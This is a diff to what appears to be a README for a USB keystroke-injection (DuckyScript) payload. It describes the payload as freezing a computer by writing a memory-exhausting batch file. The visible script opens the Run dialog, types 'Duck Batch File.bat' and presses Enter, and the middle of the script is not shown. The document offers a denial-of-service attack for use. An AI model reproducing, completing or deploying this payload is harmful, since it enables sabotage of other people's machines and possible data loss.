@@ -1,6 +1,7 @@
 Hello! This payload will freeze the computer until you restart!
+The way it works is it creates a batch file that will eat up all the computers memory!
 
-Code:
+```code
 DELAY 1000
 GUI r
 DELAY 100
@@ -28,3 +29,4 @@ STRING Duck Batch File.bat
 DELAY 100
 ENTER
 DELAY 100
+```
